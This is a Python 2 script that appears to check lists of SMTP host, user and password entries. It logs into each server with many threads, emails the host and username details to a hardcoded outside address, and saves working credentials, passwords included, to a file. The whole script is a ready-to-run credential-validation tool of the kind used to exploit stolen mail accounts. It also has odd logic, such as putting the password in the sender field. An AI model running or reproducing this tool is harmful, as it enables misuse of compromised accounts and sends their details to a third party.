import os, time
import smtplib
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import time
class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print e
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class bcolors:
    OK = '\033[92m'  # GREEN
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR
    banner = """
    """


VALIDS = 0
INVALIDS = 0

def check(smtp):
    #urlny = smtp[0]
    HOST = smtp[0]
    PORT = "587"
    usr = smtp[2]
    pas = smtp[3]
    if "@" in smtp[2]:
     j = smtp[3]
    else:
     j = "kadalbiawak43@gmail.com"
    
    global VALIDS, INVALIDS
    toaddr = "egidio@jaffamianni.com"
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "SMTP test from " + HOST
        msg['From'] = j
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """
                <p>HOST : """ + HOST + """</p>
                <p>PORT : """ + PORT + """</p>
                <p>USER : """ + usr + """</p>
                              
        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + 'SMTP WORK {} '.format(smtp) + bcolors.RESET)
        open('validsmtp.txt', 'a').write("{0}|{1}|{2}|{3}|{4}\n".format(HOST,PORT,usr,pas,j))
        time.sleep(1)
        VALIDS += 1
        
    except Exception as e:
       print(e)
       INVALIDS += 1
       print(bcolors.FAIL + 'SMTP NOT WORK {} '.format(smtp) + bcolors.RESET)
       if "501" in str(e):
        open('smtpinvalidfm.txt', 'a').write("{0} |{1}|{2}|{3}|{4}|\n".format(HOST,PORT,usr,pas,j))


if __name__ == '__main__':
  sites = raw_input(bcolors.OK + 'Enter Smtps List : ' + bcolors.RESET)
  
  lists = open(sites).read().splitlines()
  thread = raw_input("Threadd: ")
  #try:
  Pool = ThreadPool(int(thread))
  for uri in lists:
    uri = uri.split('|')
    Pool.add_task(check, uri)
    Pool.wait_completion()
  #except Exception as e:
   #print(e)


